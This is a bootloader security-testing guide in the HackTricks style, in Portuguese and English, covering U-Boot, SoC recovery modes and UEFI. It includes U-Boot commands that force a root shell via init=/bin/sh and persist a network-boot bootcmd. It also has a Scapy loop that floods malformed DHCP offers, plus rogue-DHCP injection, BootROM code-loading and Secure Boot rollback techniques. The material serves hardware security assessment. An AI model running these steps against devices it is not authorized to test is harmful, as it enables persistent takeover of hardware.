# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Os passos a seguir são recomendados para modificar configurações de inicialização do dispositivo e testar bootloaders como U-Boot e carregadores da classe UEFI. Foque em obter execução de código cedo, avaliar proteções de assinatura/rollback e abusar de caminhos de recuperação ou boot por rede.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Durante o boot, pressione uma tecla de interrupção conhecida (frequentemente qualquer tecla, 0, space, ou uma sequência "mágica" específica da placa) antes de `bootcmd` executar para cair no prompt do U-Boot.

2. Inspect boot state and variables
- Comandos úteis:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- Anexe `init=/bin/sh` para que o kernel abra um shell em vez do init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Configure a rede e busque um kernel/fit image pela LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Se o armazenamento de env não estiver protegido contra escrita, você pode persistir controle:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam caminhos de fallback. Valores mal configurados podem conceder quebras repetidas para o shell.

6. Check debug/unsafe features
- Procure por: `bootdelay` > 0, `autoboot` desabilitado, `usb start; fatload usb 0:1 ...` sem restrições, habilidade de `loady`/`loads` via serial, `env import` de mídia não confiável, e kernels/ramdisks carregados sem checagem de assinatura.

7. U-Boot image/verification testing
- Se a plataforma alega secure/verified boot com FIT images, teste tanto imagens unsigned quanto adulteradas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou comportamento legacy `verify=n` frequentemente permite bootar payloads arbitrários.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- O tratamento legacy BOOTP/DHCP do U-Boot já teve problemas de segurança de memória. Por exemplo, CVE‑2024‑42040 descreve divulgação de memória via respostas DHCP forjadas que podem leak bytes da memória do U-Boot de volta na rede. Exercite os caminhos de código DHCP/PXE com valores excessivamente longos/casos-limite (option 67 bootfile-name, vendor options, file/servername fields) e observe por travamentos/leaks.
- Minimal Scapy snippet to stress boot parameters during netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Também valide se os campos de filename do PXE são passados para a lógica do shell/loader sem sanitização quando encadeados a scripts de provisionamento do lado do OS.

9. Rogue DHCP server command injection testing
- Configure um serviço DHCP/PXE malicioso e tente injetar caracteres nos campos filename ou options para alcançar interpretadores de comando em estágios posteriores da cadeia de boot. O auxiliary DHCP do Metasploit, `dnsmasq`, ou scripts customizados em Scapy funcionam bem. Assegure isolar a rede de laboratório primeiro.

## SoC ROM recovery modes that override normal boot

Muitos SoCs expõem um modo BootROM "loader" que aceitará código via USB/UART mesmo quando imagens de flash são inválidas. Se os fusíveis de secure-boot não estiverem queimados, isso pode fornecer execução arbitrária de código muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Avalie se o dispositivo tem eFuses/OTP de secure-boot queimados. Caso não, modos de download BootROM frequentemente bypassam qualquer verificação de nível superior (U-Boot, kernel, rootfs) executando seu payload de primeira etapa diretamente de SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Monte a EFI System Partition (ESP) e verifique componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logo do vendor.
- Tente bootar com componentes assinados downgraded ou conhecidos-vulneráveis se as revogações do Secure Boot (dbx) não estiverem atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, frequentemente é possível carregar seu próprio kernel ou `grub.cfg` a partir da ESP para ganhar persistência.

11. Boot logo parsing bugs (LogoFAIL class)
- Vários firmwares OEM/IBV eram vulneráveis a falhas de parsing de imagem no DXE que processam boot logos. Se um atacante puder colocar uma imagem construída na ESP sob um caminho específico do vendor (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reiniciar, execução de código durante o boot inicial pode ser possível mesmo com Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos são graváveis a partir do OS.

## Hardware caution

Seja cauteloso ao interagir com SPI/NAND flash durante o boot inicial (por exemplo, aterrar pinos para burlar leituras) e sempre consulte o datasheet do flash. Curtos temporizados incorretamente podem corromper o dispositivo ou o programador.

## Notes and additional tips

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs de environment entre RAM e armazenamento; algumas plataformas permitem importar env de mídia removível sem autenticação.
- Para persistência em sistemas Linux que bootam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot frequentemente é suficiente quando não há checagens de assinatura.
- Se o userland fornecer `fw_printenv/fw_setenv`, valide que `/etc/fw_env.config` corresponde ao armazenamento real de env. Offsets mal configurados permitem ler/gravar a região MTD errada.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
